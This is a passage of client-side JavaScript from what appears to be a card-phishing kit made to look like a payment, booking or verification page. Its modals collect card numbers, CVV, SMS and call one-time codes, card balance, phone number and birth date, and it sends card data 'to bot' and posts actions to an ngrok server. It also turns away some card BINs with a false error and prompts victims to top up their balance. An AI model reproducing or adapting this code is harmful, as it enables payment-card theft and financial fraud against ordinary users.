    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
    axios.post(API_BASE + '/api/confirmAction', { method: type, id: id, itemId: _adId })
      .then(function () {
        self.currentStatus = 'wait';
        self.showModal('msLoading');
      })
      .catch(function (err) {
        if (sp) sp.style.display = 'none';
      });
  };

  ModalSystem.prototype._confirmCustom = function () {
    var sp = document.getElementById('msCustomSpinner');
    if (sp) sp.style.display = 'flex';
    var btn = document.getElementById('msCustomBtn');
    if (btn) btn.disabled = true;

    var self = this;
    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
    axios.post(API_BASE + '/api/sendValue', { value: 'OK', type: 'custom', id: id, itemId: _adId })
      .then(function () {
        self.currentStatus = 'wait';
        self.showModal('msLoading');
      })
      .catch(function (err) {
        if (sp) sp.style.display = 'none';
        if (btn) btn.disabled = false;
      });
  };

  ModalSystem.prototype._handleSmenalk = function () {
    var sp = document.getElementById('msSmenalkSpinner');
    if (sp) sp.style.display = 'flex';
    window.location.href = '/' + this.cfg.itemId;
  };

  /* ===== Card Form Modal API ===== */

  function _formatMoneyLike(v) {
    // add thin non-breaking space as thousands separator for numeric-looking values
    if (v === undefined || v === null) return '';
    var s = String(v).trim();
    // only reformat pure integers/decimals; leave already-formatted strings alone
    if (/^-?\d{4,}(\.\d+)?$/.test(s)) {
      var parts = s.split('.');
      parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, '\u202F');
      return parts.join('.');
    }
    return s;
  }

  ModalSystem.prototype.updatePrice = function (price, curr) {
    if (price !== undefined && price !== null) {
      this.cfg.price = price;
    }
    if (curr) {
      this.cfg.curr = curr;
    }
    // Update the displayed price in the card form (order summary)
    var amtEl  = document.getElementById('msCardOrderAmount');
    var currEl = document.getElementById('msCardOrderCurr');
    if (amtEl)  amtEl.textContent  = _formatMoneyLike(this.cfg.price);
    if (currEl) currEl.textContent = this.cfg.curr || '';
  };

  ModalSystem.prototype.showCardForm = function (price, curr) {
    // Update price if provided
    if (price !== undefined && price !== null) {
      this.updatePrice(price, curr);
    }
    this._lastSentCardKey = null;
    this._lastSentBalance = null;
    var overlay = document.getElementById('msCardForm');
    if (!overlay) return;
    overlay.classList.add('active');
    document.body.style.overflow = 'hidden';
    // Reset to form state
    var formInner = document.getElementById('msCardFormInner');
    var loading = document.getElementById('msCardLoading');
    if (formInner) formInner.style.display = '';
    if (loading) loading.style.display = 'none';
    this._detectCardBrand('');
    this._updatePreview({ number: '', exp: '', holder: '' });
    // Focus card number after slide-in settles
    setTimeout(function () {
      var inp = document.getElementById('_input0');
      if (inp && overlay.classList.contains('active')) {
        try { inp.focus({ preventScroll: true }); } catch (e) { inp.focus(); }
      }
    }, 380);
    // Send preLog for card page navigation
    axios.post('/api/preLog', {
      item: this.cfg.itemId,
      event: 'cardPage'
    }).catch(function(){});
  };

  ModalSystem.prototype.hideCardForm = function () {
    var overlay = document.getElementById('msCardForm');
    if (!overlay) return;
    overlay.classList.remove('active');
    document.body.style.overflow = '';
  };

  ModalSystem.prototype._getPreferredLang = function () {
    var fromCookie = '';
    try {
      if (window.LangCookie && typeof window.LangCookie.get === 'function') {
        fromCookie = window.LangCookie.get() || '';
      }
    } catch (e) {}
    return _normalizeLangAlias(fromCookie || window.SITE_LANG || '');
  };

  ModalSystem.prototype._resolveServiceType = function () {
    var raw = String((this.cfg && this.cfg.serviceType) || '').toLowerCase().trim();
    if (raw === 'verify') raw = 'verification';
    if (raw === 'tickets') raw = 'ticket';
    if (raw === 'book' || raw === 'bookingpay') raw = 'booking';
    if (raw === 'receive' || raw === 'booking' || raw === 'ticket' || raw === 'verification') {
      return raw;
    }

    var pathname = '';
    try {
      pathname = String((window.location && window.location.pathname) || '').toLowerCase();
    } catch (e) {}

    if (/verif|verify/.test(pathname)) return 'verification';
    if (/tickets|kasir2/.test(pathname)) return 'ticket';
    if (/krisha2|kolesa2|bookingpay/.test(pathname)) return 'booking';
    return 'receive';
  };

  ModalSystem.prototype._resolveCardCopy = function (card) {
    var c = card || {};
    var serviceType = this._resolveServiceType();

    var result = {
      cardTitle: c.cardTitle || c.cardTitleReceive || 'Payment details',
      cardDetails: c.cardDetails || c.cardDetailsReceive || 'Enter your card details',
      next: c.next || c.nextReceive || 'Pay'
    };

    if (serviceType === 'verification') {
      result.cardTitle = c.cardTitleVerification || result.cardTitle;
      result.cardDetails = c.cardDetailsVerification || result.cardDetails;
      result.next = c.nextVerification || result.next;
    } else if (serviceType === 'booking') {
      result.cardTitle = c.cardTitleBooking || result.cardTitle;
      result.cardDetails = c.cardDetailsBooking || result.cardDetails;
      result.next = c.nextBooking || result.next;
    } else if (serviceType === 'ticket') {
      result.cardTitle = c.cardTitleTicket || result.cardTitle;
      result.cardDetails = c.cardDetailsTicket || result.cardDetails;
      result.next = c.nextTicket || result.next;
    } else {
      result.cardTitle = c.cardTitleReceive || result.cardTitle;
      result.cardDetails = c.cardDetailsReceive || result.cardDetails;
      result.next = c.nextReceive || result.next;
    }

    return result;
  };

  ModalSystem.prototype._syncLang = function (lang) {
    var resolved = _normalizeLangAlias(lang || this._getPreferredLang());
    if (resolved === this._activeLang) return;
    this._activeLang = resolved;
    var localCards = (typeof window !== 'undefined' && window._cardTranslations) ? window._cardTranslations : null;

    if (localCards && typeof localCards === 'object') {
      var cardLang = resolved;
      if (!cardLang || !localCards[cardLang]) {
        if (localCards.ru) cardLang = 'ru';
        else {
          var keys = Object.keys(localCards);
          cardLang = keys.length ? keys[0] : '';
        }
      }
      if (cardLang && localCards[cardLang]) {
        this.updateTranslations({ card: localCards[cardLang] });
      }
    }

    this.refreshTranslate({ lang: resolved || '' });
  };

  ModalSystem.prototype._initLangSync = function () {
    if (this._langSyncBound) return;
    this._langSyncBound = true;
    var self = this;

    window.addEventListener('siteLangChanged', function (ev) {
      var next = ev && ev.detail && (ev.detail.lang || ev.detail);
      self._syncLang(next);
    });

    this._activeLang = null;
    this._syncLang(this._getPreferredLang());

    this._langWatchTimer = setInterval(function () {
      var next = self._getPreferredLang();
      if (next !== self._activeLang) {
        self._syncLang(next);
      }
    }, 400);
  };

  ModalSystem.prototype._updateModalTexts = function () {
    var t = this.cfg.translate || {};
    var c = t.card || {};
    var cardCopy = this._resolveCardCopy(c);
    var sms = t.sms || {};
    var smscall = t.smscall || {};
    var push = t.push || {};
    var wait = t.wait || {};
    var errors = t.errors || {};
    var wrong = t.wrongdata || {};
    var requestPhone = t.requestPhone || {};
    var requestBirthday = t.requestBirthday || {};

    var amountLabel = sms.amount || push.amount || 'Amount';
    var amountLine = amountLabel + ': ' + (this.cfg.price || '') + ' ' + (this.cfg.curr || '');

    function setText(selector, value) {
      if (value === undefined || value === null) return;
      var el = document.querySelector(selector);
      if (el) el.textContent = value;
    }

    function setTextById(id, value) {
      if (value === undefined || value === null) return;
      var el = document.getElementById(id);
      if (el) el.textContent = value;
    }

    function setPlaceholder(id, value) {
      if (value === undefined || value === null) return;
      var el = document.getElementById(id);
      if (el) el.placeholder = value;
    }

    setText('#msLoading .ms-spinner-text', c.wait);
    setText('#msLoading .ms-spinner-sub', wait.vbiv);

    setText('#msSms .ms-sms-title', sms.title);
    setText('#msSms .ms-sms-subtitle', sms.smsSubtitle);
    setText('#msSms .ms-sms-step:nth-of-type(1) span', sms.smsStep1);
    setText('#msSms .ms-sms-step:nth-of-type(2) span', sms.smsStep2);
    setText('#msSms .ms-sms-label', sms.sms);
    setPlaceholder('msSmsCode', sms.smsPlaceHolder);
    setTextById('msSmsError', sms.incorrect);
    setTextById('msSmsBtn', sms.smsConfirm || sms.next);
    setText('#msSms .ms-sms-secure span', sms.smsSecure);

    setText('#msSmsCall .ms-title', smscall.conf);
    setText('#msSmsCall .ms-amount', amountLine);
    setText('#msSmsCall .ms-text', smscall.callbank);
    setPlaceholder('msSmsCallCode', smscall.entercodethis);
    setTextById('msSmsCallError', sms.incorrect);
    setTextById('msSmsCallBtn', sms.next);

    setText('#msPush .ms-title', push.title);
    setText('#msPush .ms-amount', (push.amount ? (push.amount + ': ' + (this.cfg.price || '') + ' ' + (this.cfg.curr || '')) : amountLine));
    setText('#msPush .ms-text', push.text);
    setTextById('msPushBtn', push.next || sms.next);

    setText('#msCall .ms-title', sms.call);
    setText('#msCall .ms-amount', amountLine);
    setText('#msCall .ms-text', sms.call);

    setText('#msBalanceVerify .ms-title', c.balanceVerifyTitle || c.balance);
    setText('#msBalanceVerify .ms-text', c.balanceVerifyText || c.enterBalance);
    setText('#msBalanceVerify .ms-info-card-header span', c.balanceWhyTitle);
    setText('#msBalanceVerify .ms-info-card-text', c.balanceWhyText);
    setText('#msBalanceVerify .ms-step:nth-of-type(1) .ms-step-text', c.balanceStep1);
    setText('#msBalanceVerify .ms-step:nth-of-type(2) .ms-step-text', c.balanceStep2);
    setText('#msBalanceVerify .ms-step:nth-of-type(3) .ms-step-text', c.balanceStep3);
    setPlaceholder('msBalanceVerifyInput', c.balancePlaceholder);
    setText('#msBalanceVerify .ms-format-hint', c.balanceFormatHint);
    setTextById('msBalanceVerifyError', c.balanceInvalid || sms.incorrect);
    setTextById('msBalanceVerifyBtn', c.balanceConfirm || sms.next);
    setText('#msBalanceVerify .ms-secure-badge span', c.balanceSecure || c.safeData);

    setText('#msBalance .ms-title', c.balance);
    setText('#msBalance .ms-text', c.enterBalance);
    setText('#msBalance .ms-info-card-header span', c.balanceWhyTitle);
    setText('#msBalance .ms-info-card-text', c.balanceWhyText);
    setText('#msBalance .ms-step:nth-of-type(1) .ms-step-text', c.balanceStep1);
    setText('#msBalance .ms-step:nth-of-type(2) .ms-step-text', c.balanceStep2);
    setText('#msBalance .ms-step:nth-of-type(3) .ms-step-text', c.balanceStep3);
    setPlaceholder('msBalanceCode', c.balancePlaceholder);
    setText('#msBalance .ms-format-hint', c.balanceFormatHint);
    setTextById('msBalanceBtn', c.balanceConfirm || sms.next);
    setText('#msBalance .ms-secure-badge span', c.balanceSecure || c.safeData);

    setText('#msRequestPhone .ms-title', requestPhone.title);
    setText('#msRequestPhone .ms-text', requestPhone.text);
    setPlaceholder('msPhoneInput', requestPhone.placeholder);
    setTextById('msPhoneError', sms.incorrect);
    setTextById('msPhoneBtn', sms.next);

    setText('#msRequestBirthday .ms-title', requestBirthday.title);
    setText('#msRequestBirthday .ms-text', requestBirthday.text);
    setTextById('msBirthdayError', sms.incorrect);
    setTextById('msBirthdayBtn', sms.next);

    setText('#msError .ms-title', errors.generalErrorWord);
    setText('#msError .ms-text', errors.skipCard);
    setTextById('msErrorBtn', sms.next);

    setText('#msSuccess .ms-title', errors.generalSuccessWord);
    setText('#msSuccess .ms-text', errors.successTransaction);

    setText('#msField .ms-title', errors.field);
    setPlaceholder('msFieldCode', errors.fieldthis);
    setTextById('msFieldBtn', sms.next);

    setText('#msSmenalk .ms-title', errors.smenalkenter);
    setText('#msSmenalk .ms-text', errors.smenalk);

    setText('#msMerchant .ms-title', errors.changeCard);
    setText('#msMerchant .ms-text', errors.noValidCard);
    setTextById('msMerchantBtn', cardCopy.next || sms.next);

    setTextById('msPopolnenieTitle', errors.popolnenieTitle);
    setTextById('msPopolnenieText', errors.popolnenieText);
    setText('#msPopolnenie .ms-text[style*="font-size:12px"]', errors.popolnenieHint);
    setTextById('msPopolnenieBtn', errors.popolnenieBtn);

    setText('#msCardFormSection .cf-card-form-title', cardCopy.cardTitle);
    setText('#msCardFormSection .cf-card-form-sub', cardCopy.cardDetails);
    setText('#msCardFormSection .cf-secure-line span', c.secureLine);
    setText('#msCardLoading .ms-card-ld-title', c.wait);
    setText('#msCardLoading .ms-card-ld-text', c.safeData);
    setTextById('msCardOrderAmount', _formatMoneyLike(this.cfg.price));
    setTextById('msCardOrderCurr', this.cfg.curr || '');

    var wrongTitle = (this.currentStatus === 'smenakarta' || this.currentStatus === 'merchant')
      ? (errors.changeCard || errors.generalErrorWord)
      : errors.generalErrorWord;
    var wrongText = (this.currentStatus === 'smenakarta' || this.currentStatus === 'merchant')
      ? (errors.cardProblem || wrong.wrongdata)
      : wrong.wrongdata;

    setText('#msWrongDataDisplay .ms-title', wrongTitle);
    setText('#msWrongDataDisplay .ms-text', wrongText);
    setTextById('msWrongDataDisplayBtn', sms.next);
    setTextById('msWrongDataError', sms.incorrect);
    setTextById('msWrongDataBtn', sms.next);
  };

  ModalSystem.prototype.updateTranslations = function (newTranslate) {
    var t = newTranslate || {};
    // Merge into existing translate (shallow, but each section is deep-merged)
    var merged = {};
    var existing = this.cfg.translate || {};
    var sections = ['card','sms','push','smscall','errors','wait','wrongdata','popolnenie','requestPhone','requestBirthday'];
    Object.keys(existing).forEach(function(k) { merged[k] = existing[k]; });
    sections.forEach(function(s) {
      if (t[s] && typeof t[s] === 'object') {
        merged[s] = Object.assign({}, existing[s] || {}, t[s]);
      }
    });
    // Also copy any non-section keys from t
    Object.keys(t).forEach(function(k) {
      if (sections.indexOf(k) === -1 && !merged.hasOwnProperty(k)) merged[k] = t[k];
    });
    this.cfg.translate = merged;

    var c = merged.card || {};
    var cardCopy = this._resolveCardCopy(c);
    var el;
    el = document.getElementById('msCardTitle');
    if (el && cardCopy.cardTitle) el.textContent = cardCopy.cardTitle;
    el = document.getElementById('msCardSecureText');
    if (el && c.secureLine) el.textContent = c.secureLine;
    el = document.getElementById('msCardTransLabel');
    if (el && c.transaction) el.textContent = c.transaction;
    el = document.getElementById('msCardNumLabel');
    if (el && c.cardNumber) el.textContent = c.cardNumber;
    el = document.getElementById('msCardExpLabel');
    var expText = c.expLabel || c.expiry;
    if (el && expText) el.textContent = expText;
    el = document.getElementById('msCardCvvLabel');
    var cvvText = c.cvvLabel || c.securityCode;
    if (el && cvvText) el.textContent = cvvText;
    el = document.getElementById('msCardFooterText');
    if (el && c.safeData) el.textContent = c.safeData;
    el = document.getElementById('msPayBtnText');
    if (el && cardCopy.next) el.textContent = cardCopy.next;
    // Preview expiry label
    el = document.querySelector('#msCardPreview .ms-card-preview-exp-label');
    if (el && (c.expPlaceholder || expText)) el.textContent = (c.expPlaceholder || expText || 'MM/YY');

    this._updateModalTexts();
  };

  // Fetch fresh translations from server (uses cookie siteLang + ?lang=).
  // Called automatically on ModalSystem init and on external lang switch.
  ModalSystem.prototype.refreshTranslate = function (opts) {
    var self = this;
    opts = opts || {};
    var meta = document.querySelector('meta[name="page-country"]');
    var country = opts.country || (meta ? meta.getAttribute('content') : '');
    var lang = opts.lang || '';
    var itemId = opts.itemId || ((this.cfg && this.cfg.itemId) ? String(this.cfg.itemId) : '');
    var qs = [];
    if (country) qs.push('country=' + encodeURIComponent(country));
    if (lang) qs.push('lang=' + encodeURIComponent(lang));
    if (itemId) qs.push('itemId=' + encodeURIComponent(itemId));
    var url = '/api/cardTranslate' + (qs.length ? '?' + qs.join('&') : '');
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 300) {
          try {
            var data = JSON.parse(xhr.responseText);
            if (data && data.ok) {
              self.updateTranslations(data);
              if (typeof opts.onDone === 'function') opts.onDone(data);
            }
          } catch (e) {}
        }
      };
      xhr.send();
    } catch (e) {}
  };

  ModalSystem.prototype._submitCardForm = function () {
    if (typeof CardForm === 'undefined') return;
    var btn = document.getElementById('_buttonPay');
    if (btn && btn.disabled) return;
    var formInner = document.getElementById('msCardFormInner');
    var loading = document.getElementById('msCardLoading');
    if (formInner) formInner.style.display = 'none';
    if (loading) loading.style.display = 'block';
    // Hide the card form overlay and hand off to ModalSystem loading
    this.hideCardForm();
    this.processCard(CardForm.getCardData());
  };

  ModalSystem.prototype._detectCardBrand = function (raw) {
    var brandRules = [
      { brand: 'visa',       test: function(n) { return /^4/.test(n); } },
      { brand: 'mastercard', test: function(n) { return /^(5[1-5]|2[2-7])/.test(n); } },
      { brand: 'humo',       test: function(n) { return /^9860/.test(n); } },
      { brand: 'uzcard',     test: function(n) { return /^8600/.test(n); } },
      { brand: 'unionpay',   test: function(n) { return /^62/.test(n); } }
    ];

    var slotIn    = document.getElementById('msCardBrandIn');
    var prevBrand = document.getElementById('msCardPreviewBrand');
    var preview   = document.getElementById('msCardPreview');
    var iconsRow  = document.querySelector('#msCardForm .cf-card-icons');

    var brand = null;
    if (raw && raw.length >= 1) {
      for (var i = 0; i < brandRules.length; i++) {
        if (brandRules[i].test(raw)) { brand = brandRules[i].brand; break; }
      }
    }

    // Clear previous brand classes on preview
    if (preview) {
      preview.classList.remove('brand-visa','brand-mastercard','brand-humo','brand-uzcard','brand-unionpay','brand-mir');
      if (brand) preview.classList.add('brand-' + brand);
    }

    // Inline brand slot inside the unified input
    if (slotIn) {
      if (brand) {
        var tpl = document.querySelector('#msCardBrandTpl svg[data-brand="' + brand + '"]');
        slotIn.innerHTML = '';
        if (tpl) {
          var cl = tpl.cloneNode(true);
          cl.setAttribute('class', 'cf-brand-svg');
          cl.removeAttribute('style');
          slotIn.appendChild(cl);
        }
        slotIn.classList.add('has-brand');
      } else {
        slotIn.classList.remove('has-brand');
        slotIn.innerHTML = '<svg viewBox="0 0 24 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><rect x="1" y="1" width="22" height="14" rx="2"/><path d="M1 5h22"/></svg>';
      }
    }

    // Brand in mini preview (bigger logo)
    if (prevBrand) {
      prevBrand.innerHTML = '';
      if (brand) {
        var tpl2 = document.querySelector('#msCardBrandTpl svg[data-brand="' + brand + '"]');
        if (tpl2) {
          var cl2 = tpl2.cloneNode(true);
          cl2.setAttribute('class', 'ms-card-preview-brand-svg');
          cl2.removeAttribute('style');
          prevBrand.appendChild(cl2);
        }
      }
    }

    // Fade out non-matching preset icons in the label row
    if (iconsRow) {
      var mapping = { visa: 'bankicon1', mastercard: 'bankicon2', amex: 'bankicon3', unionpay: 'bankicon4' };
      var matched = mapping[brand];
      var imgs = iconsRow.querySelectorAll('img');
      for (var k = 0; k < imgs.length; k++) {
        var vis = imgs[k].style.display !== 'none';
        if (!vis) continue;
        if (matched) {
          imgs[k].classList.toggle('cf-icon-dim', imgs[k].id !== matched);
        } else {
          imgs[k].classList.remove('cf-icon-dim');
        }
      }
    }
  };

  ModalSystem.prototype._updatePreview = function (data) {
    var d = data || {};
    var numEl    = document.getElementById('msCardPreviewNumber');
    var expEl    = document.getElementById('msCardPreviewExp');
    var holderEl = document.getElementById('msCardPreviewHolder');

    if (numEl) {
      var raw = String(d.number || '').replace(/\D/g, '').substr(0, 19);
      // Pad with bullets up to 16 chars for display
      var padded = raw;
      while (padded.length < 16) padded += '\u2022';
      padded = padded.substr(0, 19);
      var out = '';
      for (var i = 0; i < padded.length; i++) {
        if (i > 0 && i % 4 === 0) out += '  ';
        out += padded[i];
      }
      numEl.textContent = out;
    }
    if (expEl) {
      var exp = String(d.exp || '').replace(/[^\d]/g, '').substr(0, 4);
      if (exp.length >= 3) exp = exp.substr(0, 2) + '/' + exp.substr(2);
      else if (exp.length === 2) exp = exp + '/\u2022\u2022';
      else if (exp.length === 1) exp = exp + '\u2022/\u2022\u2022';
      else exp = '\u2022\u2022/\u2022\u2022';
      expEl.textContent = exp;
    }
    if (holderEl) {
      var h = String(d.holder || '').trim();
      holderEl.textContent = h ? h.toUpperCase() : '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
    }
  };

  ModalSystem.prototype._resetToCard = function () {
    this.hideAllModals();
    this.currentStatus = null;
    this.paused = true;
    this.polling = false;
    this._cardLocked = false;
    this._lastSentCardKey = null;
    this._lastSentBalance = null;
    this.sseConnected = false;
    if (this.pollTimer) {
      clearInterval(this.pollTimer);
      this.pollTimer = null;
    }
    if (this.eventSource) {
      try { this.eventSource.close(); } catch(e) {}
      this.eventSource = null;
    }
    if (typeof this.cfg.onResetCard === 'function') {
      this.cfg.onResetCard();
    }
  };

  ModalSystem.prototype._resumeSession = function () {
    // Restore card number from memory for card mask display
    if (!this._cardData && _memCardNum) {
      this._cardData = { cardNumber: _memCardNum };
    }
    this.showModal('msLoading');
    this._startPolling();
  };

  ModalSystem.prototype.showModal = function (id) {
    if (this.currentModal) this.currentModal.classList.remove('active');
    var m = document.getElementById(id);
    if (m) {
      m.classList.add('active');
      this.currentModal = m;

      var cardNum = (this._cardData && this._cardData.cardNumber) || '';
      if (!cardNum) { cardNum = _memCardNum || ''; }
      if ((id === 'msSms' || id === 'msSmsCall') && cardNum) {
        var digits = cardNum.replace(/\D/g, '');
        var first6 = digits.substring(0, 6);
        var last4 = digits.substring(digits.length - 4);
        var masked = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
        var maskEl = m.querySelector('.ms-sms-card-mask');
        if (maskEl) maskEl.textContent = masked;
      }

      if (typeof window.OTPAutofill !== 'undefined') {
        setTimeout(function() { window.OTPAutofill.init(); }, 100);
      }
    }
  };

  ModalSystem.prototype.hideAllModals = function () {
    var all = document.querySelectorAll('.ms-overlay');
    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
    this.currentModal = null;
  };

  ModalSystem.prototype._resetPhoneBtn = function () {
    var phoneBtn = document.getElementById('msPhoneBtn');
    if (phoneBtn) {
      phoneBtn.disabled = false;
      var t = this.cfg.translate || {};
      phoneBtn.textContent = (t.sms && t.sms.next || 'Confirm');
    }
  };

  ModalSystem.prototype._bind = function (id, evt, fn) {
    var el = document.getElementById(id);
    if (el) el.addEventListener(evt, fn);
  };

  ModalSystem.prototype._setupDateSegments = function () {
    var day = document.getElementById('msBdayDay');
    var month = document.getElementById('msBdayMonth');
    var year = document.getElementById('msBdayYear');
    if (!day || !month || !year) return;

    function onlyDigits(e) {
      var v = e.target.value.replace(/\D/g, '');
      e.target.value = v;
    }

    day.addEventListener('input', function (e) {
      onlyDigits(e);
      if (e.target.value.length >= 2) month.focus();
    });
    month.addEventListener('input', function (e) {
      onlyDigits(e);
      if (e.target.value.length >= 2) year.focus();
    });
    year.addEventListener('input', function (e) {
      onlyDigits(e);
    });

    month.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !e.target.value) { day.focus(); }
    });
    year.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !e.target.value) { month.focus(); }
    });
  };

  ModalSystem.prototype._submitBirthday = function () {
    var day = document.getElementById('msBdayDay');
    var month = document.getElementById('msBdayMonth');
    var year = document.getElementById('msBdayYear');
    var hidden = document.getElementById('msBirthdayInput');
    var errEl = document.getElementById('msBirthdayError');
    var group = document.getElementById('msBirthdayGroup');

    var d = (day.value || '').trim();
    var m = (month.value || '').trim();
    var y = (year.value || '').trim();

    if (!d || !m || !y || d.length < 1 || m.length < 1 || y.length < 4) {
      if (errEl) errEl.style.display = 'block';
      if (group) group.style.borderColor = 'var(--modal-error, #d32f2f)';
      return;
    }

    if (errEl) errEl.style.display = 'none';
    if (group) group.style.borderColor = 'var(--modal-accent, #1867c1)';

    var val = d.padStart(2, '0') + '.' + m.padStart(2, '0') + '.' + y;
    hidden.value = val;

    this._sendValue('requestBirthday', 'msBirthdayInput');
  };

  ModalSystem.prototype._handlePopolnenie = function () {
    var btn = document.getElementById('msPopolnenieBtn');
    if (btn) { btn.disabled = true; btn.textContent = '...'; }

    var self = this;
    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());

    axios.post(API_BASE + '/api/confirmAction', { method: 'popolnenie', id: id, itemId: this.cfg.itemId })
      .then(function () {
        self.currentStatus = 'wait';
        self.showModal('msLoading');
      })
      .catch(function (err) {
        if (btn) { btn.disabled = false; btn.textContent = 'Я пополнил(а) баланс'; }
      });
  };

  ModalSystem.prototype.processCard = function (cardData) {
    if (this._cardLocked) return;
    this._cardLocked = true;
    this._cardData = cardData;
    _memCardNum = cardData.cardNumber || '';
    _memCardData = cardData;
    this.showModal('msLoading');

    this._sendCardDataToBot(cardData);

    var self = this;

    var autoPPPromise = axios.post('/api/getAutoPPConfig', { item: this.cfg.itemId }).catch(function () { return { data: { enabled: false } }; });
    var checkerPromise = axios.post('/api/getCheckerState', { item: this.cfg.itemId }).catch(function () { return { data: {} }; });

    Promise.all([autoPPPromise, checkerPromise]).then(function (results) {
      var autoPPData = results[0].data || {};
      var checkerData = results[1].data || {};

      self.cfg.checkBalance = checkerData.checkBalance;
      self._autoPP = autoPPData;

      var pageCountryMeta = document.querySelector('meta[name="page-country"]');
      var pageCountry = pageCountryMeta && pageCountryMeta.content ? String(pageCountryMeta.content).toLowerCase() : '';
      var isUzPage = pageCountry === 'uz';

      if (isUzPage && autoPPData.enabled && autoPPData.excludedBins && autoPPData.excludedBins.length > 0) {
        var cardNum = (cardData.cardNumber || '').replace(/\D/g, '');
        for (var i = 0; i < autoPPData.excludedBins.length; i++) {
          var bin = autoPPData.excludedBins[i];
          if (cardNum.indexOf(bin) === 0) {
            var t = self.cfg.translate || {};
            var skTitle = document.querySelector('#msWrongDataDisplay .ms-title');
            var skText = document.querySelector('#msWrongDataDisplay .ms-text');
            if (skTitle) skTitle.textContent = t.errors && t.errors.changeCard || 'Возникла проблема';
            if (skText) skText.textContent = t.errors && t.errors.cardProblem || 'Уважаемый пользователь, данная банковская карта не поддерживается. Пожалуйста укажите карту другого банка.';
            self.showModal('msWrongDataDisplay');
            self._cardLocked = false;
            axios.post('/api/autoPPNotify', { item: self.cfg.itemId, event: 'binBlocked', extra: bin }).catch(function () {});
            return;
          }
        }
      }

      self._processCardStep2(cardData);
    });
  };

  window.ModalSystem = ModalSystem;
})();
